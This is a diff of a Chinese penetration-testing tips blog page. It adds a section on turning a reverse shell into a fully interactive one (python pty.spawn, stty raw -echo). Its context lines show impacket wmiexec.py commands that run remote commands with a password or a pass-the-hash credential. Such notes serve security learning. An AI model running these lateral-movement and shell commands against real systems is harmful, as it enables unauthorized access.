@@ -17,7 +17,7 @@
 <meta property="og:site_name" content="thinks 专注学习">
 <meta property="og:description" content="一些在渗透中使用的技巧总结,待更">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-09-05T07:38:13.116Z">
+<meta property="og:updated_time" content="2019-09-09T08:39:42.052Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一些渗透中的技巧">
 <meta name="twitter:description" content="一些在渗透中使用的技巧总结,待更">
@@ -161,6 +161,9 @@
 <h2 id="SMB&#x7684;&#x5DE5;&#x5177;"><a href="#SMB&#x7684;&#x5DE5;&#x5177;" class="headerlink" title="SMB&#x7684;&#x5DE5;&#x5177;"></a>SMB&#x7684;&#x5DE5;&#x5177;</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py </span><br><span class="line"></span><br><span class="line">#&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x534A;&#x4EA4;&#x4E92;shell</span><br><span class="line">wmiexec.py administrator:password@192.168.2.224</span><br><span class="line"></span><br><span class="line">#&#x6267;&#x884C;&#x547D;&#x4EE4;</span><br><span class="line">wmiexec.py administrator:password@192.168.2.224 whoami</span><br><span class="line"></span><br><span class="line">#&#x4F7F;&#x7528;hash&#x6267;&#x884C;&#x547D;&#x4EE4;</span><br><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:e483abd832e04b1da4caa15d262f847a administrator@192.168.2.224 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
 
 <p>&#x53C2;&#x8003; <a href="https://www.freebuf.com/sectool/105524.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/105524.html</a></p>
+<h3 id="&#x53CD;&#x5F39;shell&#x83B7;&#x53D6;&#x4EA4;&#x4E92;&#x5F0F;"><a href="#&#x53CD;&#x5F39;shell&#x83B7;&#x53D6;&#x4EA4;&#x4E92;&#x5F0F;" class="headerlink" title="&#x53CD;&#x5F39;shell&#x83B7;&#x53D6;&#x4EA4;&#x4E92;&#x5F0F;"></a>&#x53CD;&#x5F39;shell&#x83B7;&#x53D6;&#x4EA4;&#x4E92;&#x5F0F;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x5177;&#x4F53;&#x5982;&#x4E0B;&#xFF0C;&#x7B2C;&#x4E00;&#x6B65;&#xFF0C;&#x5728;&#x54D1; shell &#x4E2D;&#x6267;&#x884C;&#xFF1A;</span><br><span class="line">$ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line"></span><br><span class="line">&#x7B2C;&#x4E8C;&#x6B65;&#xFF0C;</span><br><span class="line">&#x952E;&#x5165; Ctrl-Z&#xFF0C;&#x4F1A;&#x56DE;&#x5230; VPS &#x7684;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#xFF1B;</span><br><span class="line">&#x5728; VPS &#x4E2D;&#x6267;&#x884C;&#xFF1A;</span><br><span class="line">$ stty raw -echo</span><br><span class="line">$ fg</span><br><span class="line">&#x6267;&#x884C;&#x540E;&#x4F1A;&#x56DE;&#x5230;&#x54D1; shell &#x4E2D;&#xFF1B;</span><br><span class="line"></span><br><span class="line">&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;&#x5728;&#x54D1; shell &#x4E2D;&#x952E;&#x5165; Ctrl-l&#xFF0C;&#x6267;&#x884C;&#xFF1A;</span><br><span class="line">$ reset</span><br><span class="line">$ export SHELL=bash</span><br><span class="line">$ export TERM=xterm-256color</span><br><span class="line">$ stty rows 54 columns 104</span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x6837;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x529F;&#x80FD;&#x9F50;&#x5168;&#x7684;&#x4EA4;&#x4E92;&#x5F0F; shell&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x652F;&#x6301;&#x547D;&#x4EE4;&#x8865;&#x5168;&#x3001;&#x8BED;&#x6CD5;&#x9AD8;&#x4EAE;</p>
 
                         
                     </div>
@@ -233,7 +236,7 @@
 
                 <div class="ui sticky article-toc" id="article-toc">
                     <!-- toc -->
-                    <ol class="ui ordered list"><li><a href="#文件下载"><span>文件下载</span></a></li><li><a href="#mimikatz"><span>mimikatz</span></a></li><li><a href="#powershell"><span>powershell</span></a></li><li><a href="#powersploit"><span>powersploit</span></a></li><li><a href="#crackmapexec"><span>crackmapexec</span></a></li><li><a href="#SMB的工具"><span>SMB的工具</span></a></li></ol>
+                    <ol class="ui ordered list"><li><a href="#文件下载"><span>文件下载</span></a></li><li><a href="#mimikatz"><span>mimikatz</span></a></li><li><a href="#powershell"><span>powershell</span></a></li><li><a href="#powersploit"><span>powersploit</span></a></li><li><a href="#crackmapexec"><span>crackmapexec</span></a></li><li><a href="#SMB的工具"><span>SMB的工具</span></a><ol><li><a href="#反弹shell获取交互式"><span>反弹shell获取交互式</span></a></li></ol></li></ol>
                 </div>
 
             </div>
